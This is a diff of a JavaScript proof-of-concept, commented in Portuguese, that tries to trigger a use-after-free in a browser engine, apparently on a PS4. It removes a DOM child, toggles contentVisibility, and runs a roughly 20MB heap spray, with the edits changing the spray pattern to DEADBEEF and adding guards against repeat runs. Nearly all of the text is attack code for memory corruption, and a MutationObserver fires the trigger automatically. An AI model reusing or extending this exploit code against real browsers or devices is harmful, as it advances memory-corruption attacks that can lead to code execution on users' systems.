@@ -5,16 +5,16 @@ let uafCoreLogicHasRun = false; // Flag para controlar a execução da lógica p
 
 function heapSpray() {
   let spray = [];
-  // Reduzir o spray para testes iniciais no PS4 se 80MB for muito
-  // Talvez 2000 iterações (8MB) ou 5000 (20MB) seja mais gerenciável inicialmente.
-  // Mantenha 10000 se você tem certeza que o alvo aguenta um spray maior.
-  const sprayIterations = 5000; // Exemplo: Reduzido para 5000 (~20MB)
-  debug_log(`Iniciando heapSpray com ${sprayIterations} iterações...`);
+  const sprayIterations = 5000; // Mantendo em 5000 por enquanto
+  // Novo padrão de bytes para o spray
+  const sprayPattern = [0xDE, 0xAD, 0xBE, 0xEF]; 
+  
+  debug_log(`Iniciando heapSpray com ${sprayIterations} iterações e padrão [DE,AD,BE,EF]...`);
 
   for (let i = 0; i < sprayIterations; i++) {
     let arr = new Uint8Array(0x1000); // 4KB
     for (let j = 0; j < arr.length; j++) {
-      arr[j] = 0x41; // Preenche com 'A'
+      arr[j] = sprayPattern[j % sprayPattern.length]; // Aplica o padrão repetidamente
     }
     spray.push(arr);
   }
@@ -30,25 +30,18 @@ export function triggerUAF() {
     return;
   }
 
-  // A lógica principal do UAF (remoção e agendamento do spray) só roda uma vez.
-  if (uafCoreLogicHasRun) {
-    debug_log("Lógica principal do UAF já foi executada. Apenas alternando visibilidade e refazendo spray leve.");
-    // Em chamadas subsequentes, podemos apenas repetir o toggle de visibilidade
-    // e talvez um spray menor se a intenção for "cutucar" a área de memória.
-    // Ou simplesmente não fazer nada. Por ora, vamos repetir o spray se chamado de novo.
+  if (uafCoreLogicHasRun && !document.getElementById('runUAFBtn').disabled) { // Se já rodou e o botão está habilitado (nova tentativa)
+    debug_log("UAF já foi tentado. Para um novo teste completo, recarregue a página. Tentando apenas alternar visibilidade.");
     currentContainer.style.contentVisibility = "hidden";
-    setTimeout(() => {
+     setTimeout(() => {
         if (document.body.contains(currentContainer)) {
             currentContainer.style.contentVisibility = "auto";
         }
-        // let sprayArrays = heapSpray(); // Opcional: um spray menor aqui ou nenhum.
-        // if(sprayArrays.length > 0) {
-        //     debug_log(`(Re-spray) Heap spray realizado com ${sprayArrays.length} arrays.`);
-        // }
-        debug_log("(Re-tentativa) Tentativa de UAF concluída (visibilidade alternada).");
+        debug_log("(Re-tentativa leve) Visibilidade alternada.");
     }, 0);
     return;
   }
+
 
   const currentChild = currentContainer.querySelector(".child");
 
@@ -62,7 +55,12 @@ export function triggerUAF() {
     debug_log("Elemento .child já foi removido ou não encontrado inicialmente.");
   }
 
-  uafCoreLogicHasRun = true; // Marca que a lógica principal foi acionada
+  uafCoreLogicHasRun = true; 
+  if(document.getElementById('runUAFBtn')) { // Desabilitar botão após primeira tentativa real
+      document.getElementById('runUAFBtn').disabled = true;
+      debug_log("Botão de UAF desabilitado para prevenir sprays múltiplos acidentais. Recarregue para reabilitar.");
+  }
+
 
   setTimeout(() => {
     debug_log("Continuando UAF: contentVisibility=auto, heapSpray()...");
@@ -70,13 +68,12 @@ export function triggerUAF() {
         currentContainer.style.contentVisibility = "auto";
     } else {
         debug_log("Container foi removido do DOM antes de contentVisibility='auto'.");
-        // Se o container sumiu, não adianta prosseguir com o spray no contexto dele.
         return;
     }
     
-    let sprayArrays = heapSpray(); // Heap spray principal
+    let sprayArrays = heapSpray(); 
     if(sprayArrays.length > 0) {
-        debug_log(`Heap spray realizado com ${sprayArrays.length} arrays.`);
+        debug_log(`Heap spray realizado com ${sprayArrays.length} arrays (padrão [DE,AD,BE,EF]).`);
     }
     debug_log("Tentativa de UAF (principal) concluída. Verifique o console e comportamento do navegador.");
   }, 0);
@@ -86,21 +83,15 @@ export function triggerUAF() {
 const initialContainerForObserver = document.querySelector(".container");
 if (initialContainerForObserver) {
     const observer = new MutationObserver((mutationsList, obs) => {
-      // Aciona triggerUAF apenas se a lógica principal ainda não rodou
       if (!uafCoreLogicHasRun) { 
         debug_log("MutationObserver: DOM tree modified, chamando triggerUAF (primeira vez via observer)...");
         triggerUAF();
-        // Não é mais necessário desconectar explicitamente aqui, pois a flag uafCoreLogicHasRun
-        // impedirá que o observer cause múltiplas execuções da lógica principal.
-        // No entanto, desconectar após a primeira ativação desejada ainda é uma boa prática se
-        // o observer não for mais necessário ou para evitar processamento de mutações futuras.
+        // O triggerUAF agora desabilita o botão e uafCoreLogicHasRun impede novas execuções completas.
+        // Desconectar o observer ainda é uma boa prática para garantir.
         obs.disconnect(); 
-        debug_log("MutationObserver desconectado para evitar loops excessivos.");
+        debug_log("MutationObserver desconectado.");
       } else {
-        // Opcional: logar que o observer viu uma mutação mas a lógica principal já rodou.
-        // debug_log("MutationObserver: viu mutação, mas lógica UAF principal já executada.");
-        // Desconectar para não ficar observando desnecessariamente se já rodou.
-        obs.disconnect();
+        obs.disconnect(); // Se já rodou, apenas desconecta.
       }
     });
     observer.observe(initialContainerForObserver, { childList: true, subtree: true });
